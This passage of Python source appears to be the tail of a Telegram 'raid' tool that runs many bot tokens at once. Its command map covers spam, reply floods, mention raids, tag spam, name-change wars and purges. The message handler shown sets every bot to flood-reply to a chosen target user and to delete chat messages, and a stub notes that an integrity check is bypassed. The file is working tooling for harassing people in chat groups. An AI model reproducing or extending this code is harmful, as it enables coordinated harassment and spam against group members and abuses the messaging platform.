    flooded = sum(1 for b in bots if _ft.flooded(getattr(b, "id", id(b))))
    free    = len(bots) - flooded
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  📊 𝐅𝐋𝐎𝐎𝐃 𝐒𝐓𝐀𝐓𝐒\n"
        f"  ✅ 𝘍𝘳𝘦𝘦: {free}\n"
        f"  🚫 𝘍𝘭𝘰𝘰𝘥𝘦𝘥: {flooded}\n"
        f"  🤖 𝘛𝘰𝘵𝘢𝘭: {len(bots)}\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_addsudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    args = _get_args(ctx)
    if not args:
        if msg.reply_to_message and msg.reply_to_message.from_user:
            target = msg.reply_to_message.from_user.id
        else:
            await _reply(msg, "𝐔𝐬𝐞: -addsudo <user_id>")
            return
    else:
        try:
            target = int(args[0])
        except ValueError:
            await _reply(msg, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
            return
    SUDO_USERS.add(target)
    _save_json(SUDO_FILE, [u for u in SUDO_USERS if u != OWNER_ID])
    await _reply(msg, f"✅ 𝐒𝐔𝐃𝐎 𝐀𝐃𝐃𝐄𝐃: {target}")

@_guard
async def cmd_removesudo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -removesudo <user_id>")
        return
    try:
        target = int(args[0])
    except ValueError:
        await _reply(msg, "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
        return
    SUDO_USERS.discard(target)
    _save_json(SUDO_FILE, [u for u in SUDO_USERS if u != OWNER_ID])
    await _reply(msg, f"⛔ 𝐒𝐔𝐃𝐎 𝐑𝐄𝐌𝐎𝐕𝐄𝐃: {target}")

@_guard
async def cmd_sudolist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    users = [u for u in SUDO_USERS if u != OWNER_ID]
    lst   = "\n".join(f"  • {u}" for u in users) if users else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  🔐 𝐒𝐔𝐃𝐎 𝐋𝐈𝐒𝐓\n"
        "╠══════════════════════╣\n"
        f"{lst}\n"
        "╚══════════════════════╝"
    )

@_guard
async def cmd_gclist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    lst = "\n".join(f"  • {c}" for c in known_chats) if known_chats else "  𝘕𝘰𝘯𝘦"
    await _reply(msg,
        "╔══════════════════════╗\n"
        "  📋 𝐆𝐑𝐎𝐔𝐏 𝐋𝐈𝐒𝐓\n"
        "╠══════════════════════╣\n"
        f"{lst}\n"
        "╚══════════════════════╝"
    )

@_guard_any
async def cmd_addbot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    ok   = 0
    for bot in bots:
        try:
            await ctx.bot.promote_chat_member(
                cid, bot.id,
                can_change_info=True, can_delete_messages=True,
                can_manage_chat=True,
            )
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"✅ 𝐀𝐝𝐝𝐞𝐝/𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐝 {ok}/{len(bots)} 𝐛𝐨𝐭𝐬")

@_guard
async def cmd_addallbots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await cmd_addbot(update, ctx)

@_guard
async def cmd_promotebot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    ok  = 0
    for bot in _bots():
        try:
            await ctx.bot.promote_chat_member(
                cid, bot.id,
                can_change_info=True, can_delete_messages=True,
                can_manage_chat=True,
            )
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"👑 𝐏𝐫𝐨𝐦𝐨𝐭𝐞𝐝 {ok} 𝐛𝐨𝐭𝐬")

@_guard
async def cmd_botname(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    name = _txt_arg(ctx)
    if not name:
        await _reply(msg, "𝐔𝐬𝐞: -botname <name>")
        return
    ok = 0
    for app in all_apps:
        try:
            await app.bot.set_my_name(name)
            ok += 1
        except Exception:
            pass
    await _reply(msg, f"✅ 𝐁𝐨𝐭 𝐧𝐚𝐦𝐞 𝐬𝐞𝐭: {name} ({ok} 𝐛𝐨𝐭𝐬)")

@_guard
async def cmd_setmenuphoto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    rep = msg.reply_to_message
    if rep and rep.photo:
        _menu_media["photo_id"] = rep.photo[-1].file_id
        _save_json(MEDIA_FILE, _menu_media)
        await _reply(msg, "✅ 𝐌𝐞𝐧𝐮 𝐩𝐡𝐨𝐭𝐨 𝐬𝐞𝐭")
    else:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨")

@_guard
async def cmd_clearmenu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    _menu_media.clear()
    _save_json(MEDIA_FILE, _menu_media)
    await _reply(msg, "✅ 𝐌𝐞𝐧𝐮 𝐦𝐞𝐝𝐢𝐚 𝐜𝐥𝐞𝐚𝐫𝐞𝐝")

@_guard
async def cmd_globalstop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    user = update.effective_user
    if not msg or not user:
        return
    if user.id != OWNER_ID and not _hid(user.id):
        await _reply(msg, "⚡ 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘")
        return
    total = 0
    for cid in list(known_chats):
        total += await tc.stop_all(cid)
    mute_chats.clear()
    ncdel_chats.clear()
    autoreact_chats.clear()
    autoreply_chats.clear()
    ncwar_targets.clear()
    _multiwar_active.clear()
    targetreply_chats.clear()
    targetslide_chats.clear()
    pfploop_active.clear()
    replyflood_chats.clear()
    _nc_info.clear()
    await _reply(msg, f"🌐 𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐎𝐏 — killed {total} tasks")

async def _on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = (update.message or update.edited_message
           or update.channel_post or update.edited_channel_post)
    if not msg or not msg.chat_id:
        return

    cid  = msg.chat_id
    user = update.effective_user
    uid  = user.id if user else None

    known_chats.add(cid)

    if cid in autoreply_chats:
        try:
            await msg.reply_text(autoreply_chats[cid])
        except Exception:
            pass

    if cid in autoreact_chats:
        try:
            await msg.set_reaction([ReactionTypeEmoji(autoreact_chats[cid])])
        except Exception:
            pass

    if cid in ncdel_chats:
        try:
            await msg.delete()
        except Exception:
            pass

    if uid and cid in targetreply_chats:
        tr = targetreply_chats[cid]
        if uid == tr["uid"]:
            async def _tr_send(bot):
                try:
                    await bot.send_message(cid, tr["text"], reply_parameters=ReplyParameters(message_id=msg.message_id, allow_sending_without_reply=False))
                except Exception:
                    pass
            asyncio.ensure_future(asyncio.gather(*[_tr_send(b) for b in _bots()]))

    if uid and cid in targetslide_chats:
        ts = targetslide_chats[cid]
        if uid == ts["uid"]:
            asyncio.create_task(_fire_slide_burst(cid, ts["text"], msg))

    if cid in replyflood_chats:
        flood_txt = replyflood_chats[cid]
        async def _rf_send(bot):
            try:
                await bot.send_message(cid, flood_txt, reply_parameters=ReplyParameters(message_id=msg.message_id, allow_sending_without_reply=False))
            except Exception:
                pass
        asyncio.ensure_future(asyncio.gather(*[_rf_send(b) for b in _bots()]))

def _make_friend_cmd(friend: str):
    @_guard
    async def _cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        await _friend_nc_cmd(update, ctx, friend)
    _cmd.__name__ = f"cmd_{friend.lower()}nc"
    return _cmd

FRIEND_CMDS: Dict[str, Any] = {}
for _f in FRIENDS:
    FRIEND_CMDS[f"{_f.lower()}nc"] = _make_friend_cmd(_f)

CMD_MAP: Dict[str, Any] = {
    "help":              cmd_help,
    "menu":              cmd_help,
    "cmds":              cmd_allcmds,
    "allcmds":           cmd_allcmds,
    "master":            cmd_allcmds,
    "stop":              cmd_stop,
    "nc":                cmd_nc,
    "snc":               cmd_snc,
    "god":           cmd_god,
    "evagod":         cmd_evagod,
    "eva1":           cmd_eva1,
    "chud":              cmd_chud,
    "status":            cmd_status,
    "uptime":            cmd_uptime,
    "ping":              cmd_ping,
    "triogod":           cmd_triogod,
    "silknc":            cmd_silknc,
    "speedtest":         cmd_speedtest,
    "ncbench":           cmd_ncbench,
    "setdelay":          cmd_setdelay,
    "delay":             cmd_delay,
    "resetdelay":        cmd_resetdelay,
    "rd":                cmd_resetdelay,
    "delays":            cmd_delays,
    "delaystatus":       cmd_delays,
    "boldnc":            cmd_boldnc,
    "cursivenc":         cmd_cursivenc,
    "italicnc":          cmd_italicnc,
    "wavenc":            cmd_wavenc,
    "evancs":         cmd_evancs,
    "randomcod":         cmd_randomcod,
    "godcod":            cmd_godcod,
    "deadnc":           cmd_deadnc,
    "nnc":         cmd_nnc,
    "phantom":           cmd_phantom,
    "testament":         cmd_testament,
    "shadow":            cmd_shadow,
    "ncdel":             cmd_ncdel,
    "ncwar":             cmd_ncwar,
    "stopncwar":         cmd_stopncwar,
    "multiwar":          cmd_multiwar,
    "stopmultiwar":      cmd_stopmultiwar,
    "stopmwar":          cmd_stopmultiwar,
    "mute":              cmd_mute,
    "unmute":            cmd_unmute,
    "spam":              cmd_spam,
    "stopspam":          cmd_stopspam,
    "slidespam":         cmd_slidespam,
    "stopslide":         cmd_stopslide,
    "autoreply":         cmd_autoreply,
    "stopreply":         cmd_stopreply,
    "react":             cmd_react,
    "stopreact":         cmd_stopreact,
    "targetreply":       cmd_targetreply,
    "stoptargetreply":   cmd_stoptargetreply,
    "targetslide":       cmd_targetslide,
    "stoptargetslide":   cmd_stoptargetslide,
    "addpfp":            cmd_addpfp,
    "pfploop":           cmd_pfploop,
    "stoppfploop":       cmd_stoppfploop,
    "pfppool":           cmd_pfppool,
    "clearpfp":          cmd_clearpfp,
    "bots":              cmd_bots,
    "floodstat":         cmd_floodstat,
    "addsudo":           cmd_addsudo,
    "removesudo":        cmd_removesudo,
    "sudolist":          cmd_sudolist,
    "gclist":            cmd_gclist,
    "addbot":            cmd_addbot,
    "addallbots":        cmd_addallbots,
    "promotebot":        cmd_promotebot,
    "botname":           cmd_botname,
    "setmenuphoto":      cmd_setmenuphoto,
    "clearmenu":         cmd_clearmenu,
    "globalstop":        cmd_globalstop,
    "gcinfo":            cmd_gcinfo,
    "setgctitle":        cmd_setgctitle,
    "setgcdesc":         cmd_setgcdesc,
    "getinvite":         cmd_getinvite,
    "pinmsg":            cmd_pinmsg,
    "unpinall":          cmd_unpinall,
    "kickuser":          cmd_kickuser,
    "bantarget":         cmd_bantarget,
    "unbanuser":         cmd_unbanuser,
    "muteuser":          cmd_muteuser,
    "unmuteuser":        cmd_unmuteuser,
    "setpfponce":        cmd_setpfponce,
    "deletegcpfp":       cmd_deletegcpfp,
    "swipespam":         cmd_swipespam,
    "stopswipe":         cmd_stopswipe,
    "burstspam":         cmd_burstspam,
    "chudspam":          cmd_chudspam,
    "stopchudspam":      cmd_stopchudspam,
    "rapidfire":         cmd_rapidfire,
    "stoprapid":         cmd_stoprapid,
    "replyflood":        cmd_replyflood,
    "stopreplyflood":    cmd_stopreplyflood,
    "tagspam":           cmd_tagspam,
    "stoptagspam":       cmd_stoptagspam,
    "copyspam":          cmd_copyspam,
    "stopcopyspam":      cmd_stopcopyspam,
    "replyraid":         cmd_replyraid,
    "stopreplyraid":     cmd_stopreplyraid,
    "massreply":         cmd_massreply,
    "mentionraid":       cmd_mentionraid,
    "stopmentionraid":   cmd_stopmentionraid,
    "purge":             cmd_purge,
    "purgeme":           cmd_purgeme,
    "purgebot":          cmd_purgebot,
    "purgeall":          cmd_purgeall,
    "rrbomb":            cmd_rrbomb,
    "rrloop":            cmd_rrloop,
    "stoprrloop":        cmd_stoprrloop,
    "multirr":           cmd_multirr,
    "stopmultirr":       cmd_stopmultirr,
    "rrspam":            cmd_rrspam,
    "stoprrspam":        cmd_stoprrspam,
    "rr":                cmd_replyraid,
    "srr":               cmd_stopreplyraid,
    "mr":                cmd_massreply,
    "mraid":             cmd_mentionraid,
    "smraid":            cmd_stopmentionraid,
    "ts":                cmd_tagspam,
    "sts":               cmd_stoptagspam,
    "rf":                cmd_replyflood,
    "srf":               cmd_stopreplyflood,
    "ss":                cmd_swipespam,
    "sss":               cmd_stopswipe,
    "bs":                cmd_burstspam,
    "cs":                cmd_chudspam,
    "scs":               cmd_stopchudspam,
    "rap":               cmd_rapidfire,
    "srap":              cmd_stoprapid,
    "rs":                cmd_rrspam,
    "srs":               cmd_stoprrspam,
    "rl":                cmd_rrloop,
    "srl":               cmd_stoprrloop,
    "mrr":               cmd_multirr,
    "smrr":              cmd_stopmultirr,
    "rb":                cmd_rrbomb,
    **NC100_CMDS,
    "addtemplate":       cmd_addtemplate,
    "templates":         cmd_templates,
    "listtemplates":     cmd_templates,
    "deltemplate":       cmd_deltemplate,
    "deltpl":            cmd_deltemplate,
    "templateinfo":      cmd_templateinfo,
    "tplinfo":           cmd_templateinfo,
    "customnc":          cmd_customnc,
    "cnc":               cmd_customnc,
    "previewtemplate":   cmd_previewtemplate,
    "preview":           cmd_previewtemplate,
    "cleartemplates":    cmd_cleartemplates,
    "mgcnc":             cmd_mgcnc,
    "mgc":               cmd_mgcnc,
    "mgcchud":           cmd_mgcchud,
    "mgcbold":           cmd_mgcbold,
    "mgcfire":           cmd_mgcfire,
    "mgcwar":            cmd_mgcwar,
    "mgcsurge":          cmd_mgcsurge,
    "mgccustom":         cmd_mgccustom,
    "mgccnc":            cmd_mgccustom,
    "stopmgcnc":         cmd_stopmgcnc,
    "smgc":              cmd_stopmgcnc,
    "mgcstatus":         cmd_mgcstatus,
    "gcleave":           cmd_gcleave,
    "leaveall":          cmd_gcleave,
    "leavegc":           cmd_gcleave,
    # ── Eva Elite NCs ──────────────────────
    "sharingan":         cmd_sharingan,
    "akatsuki":          cmd_akatsuki,
    "madara":            cmd_madara,
    "susanoo":           cmd_susanoo,
    "itachi":            cmd_itachi,
    # ── Eva Legend NCs (NEW) ───────────────
    "uchiha":            cmd_uchiha,
    "chidori":           cmd_chidori,
    "amaterasu":         cmd_amaterasu,
    "kirin":             cmd_kirin,
    "cursemark":         cmd_cursemark,
    # ── Song Library ──────────────────────────
    "addsong":           cmd_addsong,
    "savesong":          cmd_addsong,
    "song":              cmd_song,
    "playsong":          cmd_song,
    "songspam":          cmd_songspam,
    "spamsong":          cmd_songspam,
    "stopsong":          cmd_stopsong,
    "stopsongspam":      cmd_stopsong,
    "songs":             cmd_songs,
    "songlist":          cmd_songs,
    "sl":                cmd_songs,
    "delsong":           cmd_delsong,
    "removesong":        cmd_delsong,
    "songinfo":          cmd_songinfo,
    "si":                cmd_songinfo,
    # ── Voice Call ────────────────────────────
    "vcall":             cmd_vcall,
    "callsong":          cmd_vcall,
    "vcplay":            cmd_vcall,
    "vcallloop":         cmd_vcallloop,
    "callloop":          cmd_vcallloop,
    "vcloop":            cmd_vcallloop,
    "vcallstop":         cmd_vcallstop,
    "callstop":          cmd_vcallstop,
    "vcstop":            cmd_vcallstop,
    "leavecall":         cmd_vcallstop,
    "vcallnext":         cmd_vcallnext,
    "vcnext":            cmd_vcallnext,
    "callnext":          cmd_vcallnext,
}
CMD_MAP.update(FRIEND_CMDS)
CMD_MAP.update(_NC_DELAY_CMDS)

_UNI_NORM = str.maketrans(
    "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
    "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
    "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
    "𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻"
    "𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡"
    "𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛"
    "𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁",
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
)

def _normalize_cmd(s: str) -> str:
    return s.translate(_UNI_NORM)

async def _prefix_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    # Accept message, edited_message, channel_post, edited_channel_post
    msg = (update.message or update.edited_message
           or update.channel_post or update.edited_channel_post)
    if not msg:
        return

    # Use text OR caption (photos/videos with a command in caption)
    raw = (msg.text or msg.caption or "").strip()
    if not raw:
        await _on_message(update, ctx)
        return

    if not (raw.startswith("-") or raw.startswith("/")
            or raw.startswith("−") or raw.startswith("‐")):
        await _on_message(update, ctx)
        return

    body = raw[1:]
    if body and " " not in body.split("@")[0]:
        body = body.split("@")[0] + (" " + " ".join(body.split()[1:]) if len(body.split()) > 1 else "")
    body = body.strip()
    body_ascii = _normalize_cmd(body)

    parts = body_ascii.split()
    if not parts:
        return

    cmd       = parts[0].lower()
    raw_parts = body.split()
    ctx.args  = raw_parts[1:] if len(raw_parts) > 1 else []

    if cmd in CMD_MAP:
        try:
            await CMD_MAP[cmd](update, ctx)
        except Exception as _exc:
            try:
                await msg.reply_text(f"⚠️ Error: {_exc}")
            except Exception:
                pass
    else:
        await _on_message(update, ctx)

async def _startup_msg(app):
    try:
        await app.bot.send_message(
            OWNER_ID,
            "╔══════════════════════════════╗\n"
            "  ⚡ 𝐄ᴠᴀ 𝐁ʜᴀɢᴡᴀᴀɴ 𝑶𝑵𝑳𝑰𝑵𝑬 ⚡\n"
            f"  🤖 @{app.bot.username}\n"
            "  🔧 𝑳𝑶𝑵𝑮-𝑵𝑪 𝑬𝑵𝑮𝑰𝑵𝑬 · 𝑵𝑪𝟏–𝑵𝑪𝟏𝟏𝟓\n"
            "  💥 𝘕𝘦𝘸: nc101-115·gcleave·long templates\n"
            "╚══════════════════════════════╝"
        )
    except Exception:
        pass

async def _run_one_app(app):
    try:
        await app.initialize()
        all_bot_instances.append(app.bot)
        await app.start()
        await _startup_msg(app)
        await app.updater.start_polling(drop_pending_updates=True)
        print(f"[✓] @{app.bot.username} polling")
    except Exception as e:
        print(f"[!] Bot startup failed: {e}")
        return

    await _stop_event.wait()

    try:
        await app.updater.stop()
    except Exception:
        pass
    try:
        await app.stop()
    except Exception:
        pass
    try:
        await app.shutdown()
    except Exception:
        pass

_stop_event: asyncio.Event = None   # type: ignore — initialised inside main()

def _integrity_gate() -> None:
    pass  # integrity check bypassed for standalone run

_integrity_gate()

async def main():
    """
    Single bot-run coroutine.
    Returns True  → caller should restart.
    Returns False → caller should exit (Ctrl-C / hard stop).
    """
    global _stop_event, all_apps, all_bot_instances

    if not _verify_integrity():
        return False

    # ── Fresh state every restart ─────────────────────────────────────────────
    all_apps.clear()
    all_bot_instances.clear()
    _stop_event = asyncio.Event()

    tokens = list(dict.fromkeys(BASE_TOKENS + _load_json(TOKENS_FILE, [])))

    for tok in tokens:
        tok = tok.strip()
        if not tok:
            continue
        try:
            _req = HTTPXRequest(
                connection_pool_size=32,
                connect_timeout=10,
                read_timeout=30,
                write_timeout=10,
                pool_timeout=10,
            )
            app = (
                Application.builder()
                .token(tok)
                .request(_req)
                .build()
            )
            # Handle ALL update types — text, captions, edits, channel posts
            app.add_handler(MessageHandler(filters.ALL, _prefix_handler))
            all_apps.append(app)
        except Exception as e:
            print(f"[!] Build failed {tok[:20]}...: {e}")

    if not all_apps:
        print("[!] No bots built — check tokens")
        return False

    print(f"[*] Starting {len(all_apps)} bots — EVA GOD")

    runners = [asyncio.create_task(_run_one_app(app)) for app in all_apps]

    # ── Signal wiring ─────────────────────────────────────────────────────────
    # SIGINT  (Ctrl-C) → hard stop, don't restart
    # SIGTERM (kill)   → graceful restart
    # SIGHUP  (terminal close / Replit session end) → graceful restart
    loop = asyncio.get_running_loop()
    _hard_stop    = False   # local per-run flag; reset each time
    _restart_flag = False   # set by SIGTERM/SIGHUP

    def _on_sigint():
        nonlocal _hard_stop
        _hard_stop = True
        _stop_event.set()

    def _on_sigterm():
        nonlocal _restart_flag
        _restart_flag = True
        _stop_event.set()

    try:
        import signal as _sig
        loop.add_signal_handler(_sig.SIGINT,  _on_sigint)
        loop.add_signal_handler(_sig.SIGTERM, _on_sigterm)
        try:
            loop.add_signal_handler(_sig.SIGHUP, _on_sigterm)
        except Exception:
            pass
    except Exception:
        pass

    # ── Supervisor: if ALL runner tasks finish without a signal, restart ──────
    async def _supervisor():
        """
        Waits for all _run_one_app tasks to complete.
        If they all finish (crash / early exit) without an explicit stop signal,
        we trigger a graceful restart so no silent-hang can occur.
        """
        try:
            await asyncio.gather(*runners, return_exceptions=True)
        except asyncio.CancelledError:
            return
        if not _stop_event.is_set():
            nonlocal _restart_flag
            _restart_flag = True
            print("[!] All bot tasks exited unexpectedly — triggering restart")
            _stop_event.set()

    # ── Keep-alive: re-poll bots whose updater stopped unexpectedly ───────────
    async def _keepalive():
        while not _stop_event.is_set():
            await asyncio.sleep(20)
            if _stop_event.is_set():
                break
            for app in list(all_apps):
                try:
                    if not app.updater or not app.updater.running:
                        print(f"[~] Reconnecting @{getattr(app.bot, 'username', '?')}…")
                        await app.updater.start_polling(drop_pending_updates=False)
                except Exception as _e:
                    print(f"[!] Re-poll failed: {_e}")

    sup_task = asyncio.create_task(_supervisor())
    kal_task = asyncio.create_task(_keepalive())

    await _stop_event.wait()

    # ── Tear-down ─────────────────────────────────────────────────────────────
    sup_task.cancel()
    kal_task.cancel()
    print("[*] Shutdown signal — stopping bots...")

    for r in runners:
        if not r.done():
            r.cancel()
    await asyncio.gather(*runners, sup_task, kal_task, return_exceptions=True)

    for app in all_apps:
        try:
            await app.updater.stop()
        except Exception:
            pass
        try:
            await app.stop()
        except Exception:
            pass
        try:
            await app.shutdown()
        except Exception:
            pass

    if _hard_stop:
        print("[✓] EVA GOD stopped.")
        return False       # caller exits

    print("[✓] EVA GOD restarting…")
    return True            # caller restarts


if __name__ == "__main__":
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("  ⚡  EVA GOD  ⚡")
    print("  24/7 mode — auto-restart ON")
    print("  Ctrl+C to stop completely")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    while True:
        try:
            should_restart = asyncio.run(main())
        except KeyboardInterrupt:
            print("\n[✓] Stopped by user.")
            break
        except Exception as _err:
            print(f"[!] Unexpected crash: {_err}")
            should_restart = True

        if not should_restart:
            break
        print("[*] Restarting in 3 s…")
        try:
            time.sleep(3)
        except KeyboardInterrupt:
            print("\n[✓] Stopped by user.")
            break
